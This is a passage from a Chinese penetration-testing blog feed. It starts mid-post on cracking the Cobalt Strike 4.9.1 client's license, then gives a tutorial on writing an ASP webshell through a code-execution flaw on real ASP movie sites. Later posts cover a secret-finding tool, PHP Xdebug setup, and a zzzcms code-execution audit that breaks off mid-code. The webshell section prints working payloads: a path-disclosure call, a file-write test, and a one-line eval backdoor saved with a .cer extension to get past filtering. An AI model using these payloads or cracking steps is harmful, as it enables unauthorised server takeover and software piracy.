punctuation">&#125;</span></code></pre><p>我们全部修改完毕了我们在重新运行一波看看。破解成功</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501102050387.png" alt="破解成功"></p><p>我们运行 Pwn3rzs 的服务端测试一波。那我们尝试修改一波<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501102105181.png" alt="如图"><br>我们搜索Licensed 发现在\AggressorInfo.java 直接copy到这个<br>csproject\src\common\AggressorInfo.java 修改一下编译尝试一下</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">common</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AggressorInfo</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> VERSION <span class="token operator">=</span> <span class="token string">"4.9.1 "</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token class-name">License</span><span class="token punctuation">.</span><span class="token function">isTrial</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"Trial"</span> <span class="token operator">:</span> <span class="token string">"(Pwn3rs)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//"Licensed");</span>   <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> VERSION_SHORT <span class="token operator">=</span> <span class="token string">"4.9.1"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>破解完毕。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501102115421.png" alt="破解完毕"><br>我们修改一下版权看看<br>csproject\src\resources\about.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Cobalt Strike 4.9.1 peiqiF4ck<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Advanced Threat Tactics Software<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Release: Oct 10, 2023<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&copy;">&amp;copy;</span> Fortra, LLC and its group of companies.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>All trademarks and registered trademarks are the property of their respective owners.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>修改编译后搞个listener上线测试。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501102124726.png" alt="如图"><br>如图测试屏幕截图和VNC功能正常要关闭杀软进行测试<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501102130201.png" alt="测试"></p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>至此我们成功破解cs 4.9.1客户端并且配合Pwn3rzs 服务端进行使用。其他功能未测试如果有暗装分析方法如上图。后面将讲解分析cs exe客户端生成方式和shellcode 关系。只有系统了解以后我们才能更好的进行免杀操作。我们总结三点<br>一:对于web渗透来说我们只需要关注信息收集 xday我们可以使用我们自己开发的exp poc工具进行集成最新的exp。那就是webframeworkTools视频教程<br>软件使用视频教程<br>webframeworktools5.0 使用教程<br> <a href="https://www.youtube.com/watch?v=TXG7W9WnbiI">https://www.youtube.com/watch?v=TXG7W9WnbiI</a> <br/><br>webframeworktools5.1 DLL生成器使用<br><a href="https://www.youtube.com/watch?v=IkhE4cNVNso">https://www.youtube.com/watch?v=IkhE4cNVNso</a> <br/><br>webframeworktools5.1 自写dll教程。使用内部封装函数编写上传功能代码。上传内容使用内部封装函数可以转换任意文件内容。编写进行上传操作。内部代码不公开仅做演示操作。其他简单的编写可以去博客看get post的教程。简单的可以直接一键生成exp<br><a href="https://www.youtube.com/watch?v=aLznRaoG_b4">https://www.youtube.com/watch?v=aLznRaoG_b4</a>  <br/><br>webframeworktools5.2 ini配置教程<br><a href="https://www.youtube.com/watch?v=DlupWCAbBgg">https://www.youtube.com/watch?v=DlupWCAbBgg</a> <br/><br>视频教程已出。不会的自行学习。旧版本自写dll存在bug。如果没有输出结果属于正常。后续版本将纠正这个bug<br/></p><p>二:我们了解了cs工作原理对于内网渗透使用opsec操作等如虎添翼。内网渗透比较难得就是域渗透。后续研究研究也是那个不过也是固定打法。多多练习就会了。<br/></p><p>三:主要是代码的问题我们分析了这么多主要是你得有java se开发基础才能听懂。另外不要光看不练。这是学不会的。<br/></p><p>参考链接:<a href="https://mp.weixin.qq.com/s/BXKPpEo7h3VqYCdOohPw2g">https://mp.weixin.qq.com/s/BXKPpEo7h3VqYCdOohPw2g</a>  个人觉得我们讲解比较详细</p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>asp 代码执行如何写webshell</title>
      <link href="/penetrationtest/2024/12/articles/51ea5543eee06d62/"/>
      <url>/penetrationtest/2024/12/articles/51ea5543eee06d62/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在修复工具bug中我看到软件扫描的结果。存在十几个asp电影网站的代码执行漏洞。我估计可能存在误报。于是乎测试了一下发现不存在误报。另外尝试使用蚁剑等工具直接连接发现报错。所以有必要写一篇文件我们有一个代码执行的点如何写shell。下面开始正文</p><h2 id="实战写webshell"><a href="#实战写webshell" class="headerlink" title="实战写webshell"></a>实战写webshell</h2><p>下图软扫描结果密码为a的就是<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121656550.png" alt="软件扫描结果"><br>我们测试一下看看是否是误报<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121657409.png" alt="不存在误报"><br>不存在误报但是使用蚁剑这些都连接不上。这时候就需要写shell了。写shell需要知道绝对路径我们获取一下绝对路径</p><pre class="language-asp" data-language="asp"><code class="language-asp">response.write(Server.MapPath(&quot;&#x2F;&quot;))</code></pre><p> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121658833.png" alt="获取web根路径"><br> 这时候我们看根目录有没有权限写入文件<br> <pre class="language-asp" data-language="asp"><code class="language-asp">a&#x3D;Server.CreateObject(&quot;Scripting.FileSystemObject&quot;).CreateTextFile(&quot;D:\\xxxx\\test.txt&quot;,True).Write(&quot;test&quot;)</code></pre><br> 根目录写入测试文件<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121659163.png" alt="根目录写入测试文件"><br> 访问看看访问那直接写shell。访问成功说明根目录可写。如果访问404那么根目录不可写在找其他目录<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121700568.png" alt="测试文件"><br>试发现只要是asp的后缀名称都是写入失败的我就不展示 了。那么我们可以写入cer这些后缀。并且写入的时候如果出现双引号”” 会报错我们可以绕过<br>写马</p><pre class="language-asp" data-language="asp"><code class="language-asp">Server.CreateObject(&quot;Scripting.FileSystemObject&quot;).CreateTextFile(&quot;D:\\xx\\test.cer&quot;,True).Write(&quot;&lt;%25eval(request(chr(97)))%25&gt;&quot;)  马子里面没有双引号直接绕过</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121702286.png" alt="写shell截图"><br>使用cknife 连接 。 蚁剑这种连接不上。当然连接以后你要上传文件可能会出问题这种简单的一句话不是长久之计。我们要写写那种小马<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121704518.png" alt="写入小马"><br>小马我就不贴了。自己修改一下就行了注意 双引号和换行这些这时候我们访问一下看看。使用url编码就行了<br>小马写入成功<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121705717.png" alt="小马写入成功"><br>我们利用这个在写入一个小马。这个马是明小子工具里面的马我们抠出来这个确实好用。</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121707712.png" alt="写入马子"><br>最后写一个大马怀旧一下。这个马应该是有个后门可以爆出密码。这些都无所谓主要是怀旧一下哈哈哈<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121711867.png" alt="致我们逝去的青春"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412121714647.png" alt="致我们逝去的青春"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>现在网站是越来越安全了。基本靠之前的手法搞很难搞了。另外现在waf比较多你要是一点代码都不会那么你将很被动。之前一个工具或者批量工具可以日站的日子没那么多了。现在需要人工配合工具。单纯靠工具getshell那是很费劲的。所以可以适当学习一门编程语言。</p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js敏感信息查找工具改造版本-peiqiF4ck</title>
      <link href="/penetrationtest/2024/12/articles/fc6ad7808b830bbd/"/>
      <url>/penetrationtest/2024/12/articles/fc6ad7808b830bbd/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在我们渗透测试中遇到小程序把他的代码反编译出来或者是在泄露source map 下载源代码以后一个一个的找铭感信息太麻烦我在github中找到一个项目<a href="https://github.com/bingtangbanli/jsfinderPro">https://github.com/bingtangbanli/jsfinderPro</a> <br/> 感觉这个项目还可以但是某些地方需要稍微改动一下才能变得不过。这个在convention.txt 里面可以添加正则表达式丰富一下工具。</p><h2 id="改造截图"><a href="#改造截图" class="headerlink" title="改造截图"></a>改造截图</h2><p>我们可以自定义加正则表达式把Hae和burpapifingder里面正则加入里面。我加了一部分出来<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202412051656549.png" alt="改造截图"><br>成品发到频道里面如果需要转载和修改请保留版权信息!!!<br>下载地址:<a href="https://t.me/SoftwareNoticeChannel/734">https://t.me/SoftwareNoticeChannel/734</a> <br/></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SecurityTools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码审计之vscode xdebug动态调试php教程</title>
      <link href="/codeaudit/2024/11/articles/40395b9e6e72cc99/"/>
      <url>/codeaudit/2024/11/articles/40395b9e6e72cc99/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>我们在进行代码审计的时候遇到复杂的代码从静态一下子看不出来就需要动态调试。我前面的文章也说了。遇到一个骚扰广告那个站点就是thinkphp开发的不过我喜欢静态和输出语句进行审计。没有进行动态调试。哪个审计出一个day配合进入后台从同ip网站间接拿下目标网站。后续等有时间出个文章写写吧。今天主要讲的是动态调试</p><h2 id="准备过程"><a href="#准备过程" class="headerlink" title="准备过程"></a>准备过程</h2><p>第一步:下载vscode,52破解分享的下载链接<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291510074.png" alt="vscode软件"><br>下载以后打开vscode 在商店里面搜索xdebug。我安卓的是1.14版本<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291512168.png" alt="xdebug"><br>安装好以后我们需要使用vscode打开要调试网站的目录并且在根目录创建一个文件内容为phpinfo();然后访问这个文件输出phpinfo内容<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291515932.png" alt="phpinfo"><br>把phpinfo 输出的所有内容复制到这个网站上面  <a href="https://xdebug.org/wizard.php">https://xdebug.org/wizard.php</a>  记住是phpinfo输出的全部内容所有内容。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291516764.png" alt="分析phpinfo内容"><br>分析结果如下:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291517126.png" alt="分析结果"><br>1:下载  php_xdebug-3.1.6-7.3-vc15-nts-x86_64.dll<br/><br>2:把下载好的dll文件复制到 E:\debugphp\Extensions\php\php7.3.4nts\ext<br/><br>3:然后在 E:\debugphp\Extensions\php\php7.3.4nts\php.ini 加入一行<br>zend_extension &#x3D; xdebug<br/><br>4：然后重启web服务器<br/><br>我们来操作<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291518415.png" alt="步骤二"><br>重命名的时候发现有php_xdeg我们可以把原来的搞个备份看看<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291520646.png" alt="步骤二"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291521084.png" alt="步骤三"><br>重启一下网站。我看再次在phpinfo页面检测xdebug这个<br>是否支持调试关键phpinfo显示了xdebug选项<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291523313.png" alt="xdebug支持"><br>我们在商店搜索一下php debug。我们的xdebug版本是3.x的。所以复制红框里面的去php.ini里面<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291524749.png" alt="xdebug调试插件版本"><br>所以我们在php.ini加入</p><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">xdebug.mode</span> <span class="token punctuation">=</span> <span class="token value attr-value">debug</span><span class="token key attr-name">xdebug.start_with_request</span> <span class="token punctuation">=</span> <span class="token value attr-value">yes</span><span class="token key attr-name">xdebug.client_port</span> <span class="token punctuation">=</span> <span class="token value attr-value">9000</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291526628.png" alt="配置文件里面加入调试"><br>注意不同的xdebug 版本 输入的东西不一样。来到debug 图标然后创建launch.json文件<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291527345.png" alt="调试选项"><br>调试语言是php。注意这里要与php.ini里面配置的端口要一样。注意更改配置文件必须重启网站!!!!<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291528854.png" alt="调试配置文件"><br>我们来到后台登陆的代码处打上断点<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291530395.png" alt="测试断点"><br>然后点击开始在运行-启动调试出现下图状态说明开始调试了<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291531565.png" alt="运行调试"><br>我们用网页访问提交账号密码<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291532719.png" alt="显示正在提交"><br>我们再看vscode里面断住没有<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291534764.png" alt="断住了"><br>但是没调试一会儿出现下面错误。这是因为apache 超时了。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291534861.png" alt="调试超时"><br>我们如何来解决这个问题呢我查询了大量资料发现他们讲的都不太行。<br><a href="https://maoshu.fun/articles/801.html">https://maoshu.fun/articles/801.html</a><br/><br><a href="https://h.opdwz.cn/feeds/SQAxf2OEme">https://h.opdwz.cn/feeds/SQAxf2OEme</a><br/><br>这下边的相对比较靠谱但是对于我们这里来说还是不太行。<br><a href="https://httpd.apache.org/mod_fcgid/mod/mod_fcgid.html">https://httpd.apache.org/mod_fcgid/mod/mod_fcgid.html</a>   <br/><br><a href="https://blog.csdn.net/qq_37482307/article/details/92236264">https://blog.csdn.net/qq_37482307/article/details/92236264</a> <br/></p><h2 id="解决phpstudy-apache调试出现超时的问题"><a href="#解决phpstudy-apache调试出现超时的问题" class="headerlink" title="解决phpstudy apache调试出现超时的问题"></a>解决phpstudy apache调试出现超时的问题</h2><p>我们来到phpino页面<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291539338.png" alt="phpinfo页面"><br>在这里 Loaded Configuration File 搜索  E:&#x2F;debugphp&#x2F;Extensions&#x2F;php&#x2F;php7.3.4nts&#x2F;<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291540570.png" alt="搜索截图"><br>打开我们搜索到文件然后添加下面的东东<br>发现真正的配置文件打开然后加入下面配置</p><pre class="language-ini" data-language="ini"><code class="language-ini">ProcessLifeTime 3600    FcgidIOTimeout 3600    FcgidConnectTimeout 3600    FcgidOutputBufferSize 128    FcgidMaxRequestsPerProcess 1000    FcgidMinProcessesPerClass 0    FcgidMaxRequestLen 268435456       FcgidInitialEnv PHP_FCGI_MAX_REQUESTS 1000    IPCConnectTimeout 3600    IPCCommTimeout 3600    FcgidIdleTimeout 3600    FcgidBusyTimeout 60000</code></pre><p>添加后的截图<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291542692.png" alt="添加后的截图"><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411291543582.png" alt="这样调试就超过8分钟了"><br>杂谈:<br/><br>光加上这两个配置只能维持8-10分钟以后直接超时:<br/><br>IPCConnectTimeout 3000 <br/><br>IPCCommTimeout 3000<br/><br>另外可以加上这个配置在php.ini里面(没啥大用处感觉)<br/><br>   max_execution_time&#x3D;0<br><br/><br>注意修改完配置文件必须要重启网站否则不生效。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们使用vscode 动态调试php 就说到了这里。说个比较切合实际的话这都公元2024年了学点编程吧。尤其是php这个入门代码审计的语言。另外python这个是入门写简单exp poc的东东建议学习一下。行了今天就说到这里下课。</p>]]></content>
      
      
      <categories>
          
          <category> CodeAudit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeAuditExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zzzcms(asp) V1.5.6 版本代码执行漏洞分析</title>
      <link href="/codeaudit/2024/11/articles/0a257de52c1f1075/"/>
      <url>/codeaudit/2024/11/articles/0a257de52c1f1075/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在4年前在浏览一篇文章zzzcms php存在代码执行漏洞。我在想那么既然php存在漏洞那么asp版本有没有漏洞呢。于是在4年前就对这个开始审计了。当然这个漏洞审计出来分享给了内部团队的人也不能算了。我一个有才是day哈哈哈。这文章是审计是4年前写的。那会儿属于0day漏洞把。放出来学习学习asp版本的代码审计吧。需要懂asp代码虽然现在asp用的太少了。开始吧<br>源代码结构截图:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261656228.png" alt="源代码"></p><h2 id="审计步骤重要以代码形式呈现"><a href="#审计步骤重要以代码形式呈现" class="headerlink" title="审计步骤重要以代码形式呈现"></a>审计步骤重要以代码形式呈现</h2><p>调用过程分析<br>C:\inetpub\wwwroot\index.asp</p><pre class="language-asp" data-language="asp"><code class="language-asp">&lt;!--#include file&#x3D;&quot;inc&#x2F;zzz_client.asp&quot;--&gt;&lt;%if  runMode&#x3D;&quot;1&quot; then aspgo(sitePath&amp;&quot;index&quot;&amp;siteExt)%&gt;</code></pre><p>C:\inetpub\wwwroot\inc\zzz_client.asp</p><pre class="language-asp" data-language="asp"><code class="language-asp">&lt;!--#include file&#x3D;&quot;zzz_template.asp&quot;--&gt;&lt;!--#include file&#x3D;&quot;zzz_user.asp&quot;--&gt;&lt;!--#include file&#x3D;&quot;ZZZ_Language.asp&quot;--&gt;&lt;!--#include file&#x3D;&quot;ZZZ_plug.asp&quot;--&gt;&lt;%if ISINSTALL&#x3D;0 and isfolder(sitepath&amp;&quot;install&quot;) then alertgo &quot;网站尚未安装，点击确定进入安装界面&quot;,&quot;&#x2F;install&quot;dim act,module,Action,SubAction,id,page,Location,SID,iswap,tag,CPageName,islistpage,iscontentpageif webMode&#x3D;0 then  goto404 siteHelp    act            &#x3D;    GetForm(&quot;act&quot;,&quot;get&quot;)    page        &#x3D;    GetForm(&quot;page&quot;,&quot;get&quot;)    SID            &#x3D;    GetForm(&quot;SID&quot;,&quot;get&quot;)    ID            &#x3D;    GetForm(&quot;id&quot;,&quot;get&quot;)    tag            &#x3D;    GetForm(&quot;tag&quot;,&quot;get&quot;)    Location    &#x3D;    getPagePath   &#39;不用带括号调用</code></pre><p>C:\inetpub\wwwroot\inc\zzz_template.asp</p><pre class="language-asp" data-language="asp"><code class="language-asp">  function getPagePath()        response.write(&quot;call me!!!!!!&quot;)        dim NowPath,Modeltype        NowPath&#x3D;getNowPagePath    :    NowPath&#x3D;replacestr(replacestr(NowPath,&quot;go&#x2F;&quot;,&quot;&quot;),&quot;index.asp?&quot;,&quot;&quot;)        if     ifstrin(NowPath,&quot;list_&quot;) then            getPagePath&#x3D;&quot;list&quot;        elseif ifstrin(NowPath,&quot;&#x2F;&quot;) then            getPagePath&#x3D;split(NowPath,&quot;&#x2F;&quot;)(1)        else            getPagePath&#x3D;&quot;&quot;        end if            end function  toLocation act,Location%&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261659940.png" alt="分析执行截图"></p><p>C:\inetpub\wwwroot\inc\zzz_class.asp</p><pre class="language-asp" data-language="asp"><code class="language-asp">sub toLocation(act,Location)    dim data    if not isnul(act) then          call selectact(act)    elseif not isnul(Location) then          call selectLocation(Location)    else        Call Zhl.Run_index    end ifend subsub selectLocation(str)    if Asc(left(CPageName,1))&lt;91 and Asc(left(CPageName,1))&gt;64 then        if dbcount(&quot;[dbpre]sort&quot;,&quot;S_URL&#x3D;&#39;&quot;&amp;CPageName&amp;&quot;&#39; and S_onoff&#x3D;1&quot;)&gt;0 then            dim data : data&#x3D;dbload(&quot;[dbpre]sort&quot;,&quot;sid,S_type&quot;,1,&quot;S_URL&#x3D;&#39;&quot;&amp;CPageName&amp;&quot;&#39; and S_onoff&#x3D;1&quot;,&quot;&quot;)            sid&#x3D;data(0,0)                if ifstrin(&quot;product,news,photo,case,down,job,video&quot;,data(1,0)) then                Location&#x3D;&quot;list&quot;            else                Location&#x3D;data(1,0)            end if        end if    end if        if ifPageName(CPageName) then                                data&#x3D;dbload(&quot;[dbpre]content&quot;,&quot;C_sid,CID&quot;,1,&quot;C_pagename&#x3D;&#39;&quot;&amp;CPageName&amp;&quot;&#39;&quot;,&quot;&quot;)        sid&#x3D;data(0,0)        id&#x3D;data(1,0)    end if    Select Case Location        Case &quot;about&quot;    :    Call Zhl.Run_about(SID,Page)        Case &quot;brand&quot;    :    Call Zhl.Run_brand(id,page)        Case &quot;list&quot;,&quot;screen&quot;,&quot;brandlist&quot;    :    Call Zhl.Run_list(Location,SID,Page)        Case &quot;tag&quot;        :    Call Zhl.Run_tag(Location,Page)                Case &quot;product&quot;,&quot;news&quot;,&quot;photo&quot;,&quot;case&quot;,&quot;down&quot;,&quot;job&quot;,&quot;video&quot;,&quot;content&quot;    :    Call Zhl.Run_content(Location,sid,id,page)            Case &quot;search&quot;    :    Call Zhl.Run_search(Location,SID,Page)                Case &quot;comment&quot;    :    Call Run_comment(Location,SID,Page)        Case &quot;submission&quot;    :    Call Run_submission        Case &quot;user&quot;        :    Call Run_user        Case &quot;shop&quot;        :    Call Run_shop        Case &quot;gbook&quot;    :    Call Zhl.Run_gbook        Case &quot;form&quot;        :    Call Zhl.Run_form(id)        Case replace(adminPath,&quot;&#x2F;&quot;,&quot;&quot;)    :    aspgo sitepath&amp;adminPath&amp;&quot;login.asp&quot;        Case else        :    Call Zhl.Run_other()        &#39;case else  : echop request.serverVariables(&quot;URL&quot;)&amp;&quot;act:&quot;&amp;act&amp;&quot;　Location:&quot;&amp;Location&amp;&quot;　SID:&quot;&amp;SID&amp;&quot;　id:&quot;&amp;id&amp;&quot;　page:&quot;&amp;page    End Selectend sub</code></pre><p>C:\inetpub\wwwroot\inc\zzz_template.asp</p><pre class="language-asp" data-language="asp"><code class="language-asp">&#39;生成[搜索结果]静态页面    Function Run_search(Location,sid,page)        dim rs,content,sql        searchkeys&#x3D;enhtml(getform(&quot;keys&quot;,&quot;both&quot;))            if not isnul(searchkeys) then setcookie &quot;searchkeys&quot;,searchkeys else searchkeys&#x3D;getcookie(&quot;searchkeys&quot;)            searchtype&#x3D;enhtml(getform(&quot;type&quot;,&quot;both&quot;))            if not isnul(searchtype) then setcookie &quot;searchtype&quot;,searchtype else searchtype&#x3D;getcookie(&quot;searchtype&quot;)            addcookie &quot;cookiekeys&quot;,searchkeys&amp;&quot;|&quot;&amp;searchtype        Call Template_Int()&#39;初始化模板        TempFile   &#x3D; TemplateFilePath&amp;&quot;search.html&quot; &#39;模板路径        call LoadParse()            call LoadlistParse        zhl.show()    End Function</code></pre><p>C:\inetpub\wwwroot\inc\zzz_template.asp</p><pre class="language-asp" data-language="asp"><code class="language-asp">Function Template_Int()        TemplatePath    &#x3D;sitepath &amp;&quot;template&#x2F;pc&#x2F;&quot;&amp; zset.PcTemplate                TemplateFilePath &#x3D; sitepath &amp;&quot;template&#x2F;pc&#x2F;&quot;&amp;zset.PcTemplate&amp;zset.PchtmlPath            Locationpath&#x3D;&quot;&lt;a href&#x3D;&#39;&quot;&amp;sitePath&amp;&quot;&#39;&gt;&quot;&amp;str_index&amp;&quot;&lt;&#x2F;a&gt;&quot;        CacheFolder &#x3D;sitepath&amp;CachePath        htmlFolder  &#x3D;sitepath&amp;htmlDir        pluginspath &#x3D;sitepath&amp;&quot;plugins&#x2F;&quot;    End Function    public sub LoadParse()            ZContent &#x3D; loadFile(TempFile)    call ParseTopAndFoot()        call ParseGlobal()    &#39;底层基础    end sub&#39;扩展解析    public sub LoadlistParse()    call parseDBLoop()    &#39;列表循环    call parseDBLoop()    &#39;列表循环    call parseAdLoop()    &#39;广告        call ParseLabels()    &#39;自定义标签        call Parsepics()    &#39;相册    call LoadplugLoop()    call parsehidestr()    &#39;隐藏*    call parseleftstr()    &#39;左侧截取    call parseformatDate()    &#39;格式化时间        call parsecounts()    &#39;统计数量    call parseDBLoop()    &#39;列表循环        call parseIf(&quot;&quot;)    &#39;解析判断    end sub&#39;解析if    Public Function parseIf(str)     &#39;response.write(str&amp;&quot;test&quot;)    &#39;response.write(&quot;####################################3&quot;)    &#39; Exit Function        on error resume next        if not ifStrin(Zcontent,&quot;&#123;if&quot;&amp;str&amp;&quot;:&quot;) then Exit Function        dim mif,matchesIf,strIf,strThen,strThen1,strElse1,iflabel2,iflabel3        dim ifFlag,ElseArray,ElseIfSubArray,ElseArrayLen,ReStr,ElseLen,strElseIf,strElseIfThen,elseIfFlag        iflabel&#x3D;&quot;&#123;if&quot;&amp;str&amp;&quot;:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&quot;&amp;str&amp;&quot;&#125;&quot;        iflabel2&#x3D;&quot;&#123;elseif&quot;&amp;str&amp;&quot;&quot;        iflabel3&#x3D;&quot;&#123;else&quot;&amp;str&amp;&quot;&#125;&quot;        elseIfFlag&#x3D;false        Zreg.Pattern&#x3D;iflabel        set matchesIf&#x3D;Zreg.Execute(Zcontent)        for each mif in matchesIf            strIf&#x3D;mif.SubMatches(0):strThen&#x3D;mif.SubMatches(1)            if instr(strThen,iflabel2)&gt;0 then                ElseArray&#x3D;split(strThen,iflabel2)                ElseArrayLen&#x3D;ubound(ElseArray)                ElseIfSubArray&#x3D;split(ElseArray(ElseArrayLen),iflabel3)                ReStr&#x3D;ElseIfSubArray(1)                                Execute(&quot;if &quot;&amp;strIf&amp;&quot; then ReStr&#x3D;ElseArray(0)&quot;)                for ElseLen&#x3D;1 to ElseArrayLen-1                    strElseIf&#x3D;getSubStrByFromAndEnd(ElseArray(ElseLen),&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;)                    strElseIfThen&#x3D;getSubStrByFromAndEnd(ElseArray(ElseLen),&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;)                    Execute(&quot;if &quot;&amp;strElseIf&amp;&quot; then ReStr&#x3D;strElseIfThen&quot;)                    Execute(&quot;if &quot;&amp;strElseIf&amp;&quot; then elseIfFlag&#x3D;true else  elseIfFlag&#x3D;false&quot;)                    if elseIfFlag then exit for                next                Execute(&quot;if 